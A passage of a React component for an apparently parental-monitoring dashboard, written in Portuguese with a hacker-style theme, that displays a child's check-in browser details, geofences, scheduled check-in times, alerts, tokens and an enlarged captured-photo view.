                          {checkin.cookiesAtivos !== null && (
                            <span className={`px-1.5 py-0.5 text-[10px] border ${checkin.cookiesAtivos ? 'border-hacker-glow/40 text-hacker-glow bg-hacker-glow/10' : 'border-red-500/40 text-red-400 bg-red-900/20'}`}>
                              {checkin.cookiesAtivos ? '🍪 cookies ON' : '🍪 cookies OFF'}
                            </span>
                          )}
                          {checkin.dnt !== null && checkin.dnt && (
                            <span className="px-1.5 py-0.5 text-[10px] border border-orange-500/40 text-orange-400 bg-orange-900/20">
                              🚫 DNT ativo
                            </span>
                          )}
                          {checkin.webdriver !== null && checkin.webdriver && (
                            <span className="px-1.5 py-0.5 text-[10px] border border-red-500/40 text-red-400 bg-red-900/20">
                              🤖 webdriver detectado
                            </span>
                          )}
                        </div>
                      </>
                    )}

                    {/* Fontes */}
                    {checkin.fontes && (
                      <>
                        <div className="border-t border-hacker-border/50 my-1" />
                        <details className="cursor-pointer">
                          <summary className="text-hacker-muted text-[10px] hover:text-hacker-dim">▶ fontes detectadas ({checkin.fontes.split(', ').length})</summary>
                          <p className="text-hacker-dim text-[10px] mt-1 leading-relaxed">{checkin.fontes}</p>
                        </details>
                      </>
                    )}
                  </div>
                </div>
              </div>
            ))
          )}
        </div>
      )}

      {/* Tab: Cercas Virtuais */}
      {tab === 'cercas' && (
        <div className="space-y-4">
          <div className="flex justify-end">
            <button onClick={() => setShowCercaForm(!showCercaForm)} className="btn-primary text-sm font-mono">
              {showCercaForm ? '$ cancelar' : '$ adicionar_cerca'}
            </button>
          </div>

          {showCercaForm && (
            <form onSubmit={criarCerca} className="card space-y-4">
              <h3 className="font-bold text-hacker-glow font-mono text-sm">{'>'} nova cerca virtual</h3>
              <p className="text-xs text-hacker-dim font-mono">
                // define zona segura. alerta disparado se {filho.nome} pingar fora do perímetro.
              </p>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs text-hacker-dim mb-1 font-mono">$ nome *</label>
                  <input type="text" value={cercaNome} onChange={(e) => setCercaNome(e.target.value)} required
                    className="input-field" placeholder="ex: escola, casa_avo" />
                </div>
                <div>
                  <label className="block text-xs text-hacker-dim mb-1 font-mono">$ raio (m) *</label>
                  <input type="number" value={cercaRaio} onChange={(e) => setCercaRaio(e.target.value)} required min="50" max="10000"
                    className="input-field" />
                </div>
                <div>
                  <label className="block text-xs text-hacker-dim mb-1 font-mono">$ latitude *</label>
                  <input type="text" value={cercaLat} onChange={(e) => setCercaLat(e.target.value)} required
                    className="input-field" placeholder="-23.550520" />
                </div>
                <div>
                  <label className="block text-xs text-hacker-dim mb-1 font-mono">$ longitude *</label>
                  <input type="text" value={cercaLng} onChange={(e) => setCercaLng(e.target.value)} required
                    className="input-field" placeholder="-46.633308" />
                </div>
              </div>
              <div className="flex gap-3">
                <button type="button" onClick={obterLocalizacaoAtual} className="btn-secondary text-xs font-mono">
                  $ gps --atual
                </button>
                <button type="submit" className="btn-success text-xs font-mono">$ criar_cerca</button>
              </div>
            </form>
          )}

          {filho.cercas.length === 0 && !showCercaForm ? (
            <div className="card text-center py-8">
              <div className="text-hacker-muted text-3xl mb-3 font-mono">[~~]</div>
              <p className="text-hacker-dim font-mono text-sm">// nenhuma cerca configurada</p>
              <p className="text-hacker-muted text-xs mt-1 font-mono">$ adicionar_cerca para criar perímetro</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {filho.cercas.map((cerca) => (
                <div key={cerca.id} className={`card border-l-2 ${cerca.ativa ? 'border-l-hacker-glow' : 'border-l-hacker-muted'}`}>
                  <div className="flex items-center justify-between mb-2">
                    <h4 className="font-bold text-hacker-glow font-mono text-sm">{cerca.nome}</h4>
                    <span className={`text-xs font-mono ${cerca.ativa ? 'text-hacker-glow' : 'text-red-400'}`}>
                      [{cerca.ativa ? 'ATIVA' : 'INATIVA'}]
                    </span>
                  </div>
                  <p className="text-xs text-hacker-dim font-mono mb-1">
                    coords: {cerca.latitude.toFixed(6)}, {cerca.longitude.toFixed(6)}
                  </p>
                  <p className="text-xs text-hacker-dim font-mono mb-3">
                    raio: {cerca.raio}m
                  </p>
                  <div className="flex gap-2">
                    <a href={`https://www.google.com/maps?q=${cerca.latitude},${cerca.longitude}`}
                      target="_blank" rel="noopener noreferrer" className="btn-secondary text-xs flex-1 text-center font-mono">
                      $ mapa
                    </a>
                    <button onClick={() => toggleCerca(cerca.id, cerca.ativa)}
                      className="btn-secondary text-xs font-mono">
                      {cerca.ativa ? '$ desativar' : '$ ativar'}
                    </button>
                    <button onClick={() => removerCerca(cerca.id)} className="btn-danger text-xs font-mono">remover</button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* Tab: Horários Programados */}
      {tab === 'horarios' && (
        <div className="space-y-4">
          <div className="flex justify-end">
            <button onClick={() => setShowHorarioForm(!showHorarioForm)} className="btn-primary text-sm font-mono">
              {showHorarioForm ? '$ cancelar' : '$ adicionar_horário'}
            </button>
          </div>

          {showHorarioForm && (
            <form onSubmit={criarHorario} className="card space-y-4">
              <h3 className="font-bold text-hacker-glow font-mono text-sm">{'>'} novo horário programado</h3>
              <p className="text-xs text-hacker-dim font-mono">
                // define cron para check-ins regulares de {filho.nome}
              </p>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs text-hacker-dim mb-1 font-mono">$ dia</label>
                  <select value={horarioDia} onChange={(e) => setHorarioDia(e.target.value)} className="input-field">
                    {DIAS_SEMANA.map(d => (
                      <option key={d.value} value={d.value}>{d.label}</option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-xs text-hacker-dim mb-1 font-mono">$ hora</label>
                  <input type="time" value={horarioHora} onChange={(e) => setHorarioHora(e.target.value)}
                    className="input-field" />
                </div>
              </div>
              <button type="submit" className="btn-success text-xs font-mono">$ salvar</button>
            </form>
          )}

          {filho.horarios.length === 0 && !showHorarioForm ? (
            <div className="card text-center py-8">
              <div className="text-hacker-muted text-3xl mb-3 font-mono">[..]</div>
              <p className="text-hacker-dim font-mono text-sm">// nenhum cron configurado</p>
              <p className="text-hacker-muted text-xs mt-1 font-mono">$ adicionar_horário para programar registros</p>
            </div>
          ) : (
            <div className="card">
              <div className="overflow-x-auto">
                <table className="w-full font-mono text-xs">
                  <thead>
                    <tr className="border-b border-hacker-border">
                      <th className="text-left px-4 py-3 text-hacker-dim uppercase">dia</th>
                      <th className="text-left px-4 py-3 text-hacker-dim uppercase">hora</th>
                      <th className="text-left px-4 py-3 text-hacker-dim uppercase">status</th>
                      <th className="px-4 py-3"></th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-hacker-border/50">
                    {filho.horarios.map((h) => (
                      <tr key={h.id} className="hover:bg-hacker-glow/5">
                        <td className="px-4 py-3 text-hacker-glow">
                          {DIAS_SEMANA.find(d => d.value === h.diaSemana)?.label || h.diaSemana}
                        </td>
                        <td className="px-4 py-3 text-hacker-glow">{h.horario}</td>
                        <td className="px-4 py-3">
                          <span className={`text-xs ${h.ativo ? 'text-hacker-glow' : 'text-red-400'}`}>
                            [{h.ativo ? 'ATIVO' : 'INATIVO'}]
                          </span>
                        </td>
                        <td className="px-4 py-3 text-right">
                          <button onClick={() => removerHorario(h.id)} className="text-red-400 hover:text-red-300 text-xs font-mono">
                            $ remover
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>
      )}

      {/* Tab: Alertas */}
      {tab === 'alertas' && (
        <div className="space-y-3">
          {filho.alertas.length === 0 ? (
            <div className="card text-center py-8">
              <div className="text-hacker-glow text-3xl mb-3 font-mono">[OK]</div>
              <p className="text-hacker-dim font-mono text-sm">// nenhum alerta registrado</p>
            </div>
          ) : (
            filho.alertas.map((alerta) => (
              <div key={alerta.id} className={`card border-l-2 ${
                alerta.tipo === 'FORA_CERCA' ? 'border-l-red-500' :
                alerta.tipo === 'CHECKIN_ATRASADO' ? 'border-l-yellow-500' :
                alerta.tipo === 'CHECKIN_REALIZADO' ? 'border-l-cyan-500' :
                'border-l-hacker-muted'
              } ${!alerta.lido ? 'bg-hacker-glow/5' : ''}`}>
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-sm text-hacker-glow font-mono">{alerta.mensagem}</p>
                    <p className="text-xs text-hacker-muted mt-1 font-mono">{formatDate(alerta.createdAt)}</p>
                  </div>
                  <span className={`text-xs font-mono ${
                    alerta.tipo === 'FORA_CERCA' ? 'text-red-400' :
                    alerta.tipo === 'CHECKIN_REALIZADO' ? 'text-cyan-400' :
                    alerta.tipo === 'CHECKIN_ATRASADO' ? 'text-yellow-400' :
                    'text-hacker-muted'
                  }`}>
                    [{alerta.tipo.replace('_', '/')}]
                  </span>
                </div>
              </div>
            ))
          )}
        </div>
      )}

      {/* Tokens gerados */}
      {filho.tokens.length > 0 && (
        <div className="card">
          <h3 className="font-bold text-hacker-glow mb-3 font-mono text-sm">{'>'} tokens gerados</h3>
          <div className="overflow-x-auto">
            <table className="w-full font-mono text-xs">
              <thead>
                <tr className="border-b border-hacker-border">
                  <th className="text-left px-4 py-2 text-hacker-dim uppercase">código</th>
                  <th className="text-left px-4 py-2 text-hacker-dim uppercase">criado</th>
                  <th className="text-left px-4 py-2 text-hacker-dim uppercase">expira</th>
                  <th className="text-left px-4 py-2 text-hacker-dim uppercase">status</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-hacker-border/50">
                {filho.tokens.slice(0, 10).map((t) => {
                  const expirado = new Date() > new Date(t.expiracao);
                  return (
                    <tr key={t.id} className="hover:bg-hacker-glow/5">
                      <td className="px-4 py-2 text-hacker-muted">{t.token.substring(0, 8)}...</td>
                      <td className="px-4 py-2 text-hacker-dim">{formatDate(t.createdAt)}</td>
                      <td className="px-4 py-2 text-hacker-dim">{formatDate(t.expiracao)}</td>
                      <td className="px-4 py-2">
                        <span className={`text-xs ${
                          t.usado ? 'text-hacker-glow' :
                          expirado ? 'text-red-400' :
                          'text-cyan-400'
                        }`}>
                          [{t.usado ? 'USADO' : expirado ? 'EXPIRADO' : 'ATIVO'}]
                        </span>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Modal de foto ampliada */}
      {fotoModal && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-sm"
          onClick={() => setFotoModal(null)}
        >
          <div
            className="relative max-w-4xl w-full mx-4"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Botão fechar */}
            <button
              onClick={() => setFotoModal(null)}
              className="absolute -top-10 right-0 text-[#00ff41] hover:text-white text-2xl font-mono transition-colors"
            >
              [✕ FECHAR]
            </button>

            {/* Imagem ampliada */}
            <img
              src={fotoModal.url}
              alt="Foto capturada"
              className="w-full max-h-[80vh] object-contain rounded border border-[#1a2e1a] shadow-lg shadow-[#00ff41]/20"
            />

            {/* Rodapé com data e download */}
            <div className="mt-3 flex items-center justify-between">
              <span className="text-[#0a6e20] font-mono text-sm">
                📅 {fotoModal.data}
              </span>
              <button
                onClick={() => downloadFoto(fotoModal.url, filho?.nome || 'foto')}
                className="px-4 py-2 bg-[#0d120d] border border-[#1a2e1a] rounded text-[#00ff41] font-mono text-sm hover:bg-[#1a2e1a] hover:shadow-[0_0_15px_rgba(0,255,65,0.3)] transition-all"
              >
                ⬇ DOWNLOAD FOTO
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
